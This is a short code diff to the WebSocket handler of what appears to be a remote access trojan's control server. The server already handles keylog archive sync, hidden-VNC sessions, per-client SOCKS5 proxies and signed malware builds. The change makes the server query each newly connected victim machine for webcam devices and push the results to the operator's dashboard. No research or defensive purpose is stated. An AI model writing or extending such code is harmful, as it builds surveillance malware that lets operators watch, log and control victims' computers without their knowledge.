@@ -18,7 +18,7 @@ import * as sessionManager from "../../sessions/sessionManager";
 import type { SocketData } from "../../sessions/types";
 import type { ClientInfo } from "../../types";
 import { clearClientSyncState, handleFrame, handleHello, handlePing, handlePong } from "../../wsHandlers";
-import { queueClientDbUpdate } from "../../client-db-sync";
+import { flushQueuedClientDbUpdates, queueClientDbUpdate } from "../../client-db-sync";
 import { getMaxPayloadLimit, getMessageByteLength, isAllowedClientMessageType } from "../../wsValidation";
 import { stopAllProxiesForClient } from "../socks5-proxy-manager";
 import { verifyBuildToken, isBuildBanned } from "../build-signing";
@@ -668,6 +668,7 @@ export async function handleWebSocketMessage(
         }
 
         await handleHello(infoObj, payload as Hello, ws, ip);
+        flushQueuedClientDbUpdates();
         clientManager.addClient(infoObj.id, infoObj);
 
         clearThumbnail(resolvedId);
@@ -678,6 +679,7 @@ export async function handleWebSocketMessage(
         deps.dispatchAutoDeploysForConnection(infoObj, ws);
         deps.dispatchAutoLoadPlugins(infoObj);
         deps.dispatchKeylogArchiveSync?.(infoObj.id, ws);
+        deps.sendDesktopCommand(infoObj, "webcam_list", {});
         deps.notifyDashboard();
         if (!reconnectedWithinGrace) {
           deps.notifyDashboardClientEvent("client_online", {
@@ -840,6 +842,7 @@ export async function handleWebSocketMessage(
         break;
       case "webcam_devices":
         deps.handleWebcamDevices(client.id, payload);
+        deps.notifyDashboard();
         break;
       case "hvnc_clone_progress":
         deps.handleHVNCCloneProgress(client.id, payload);
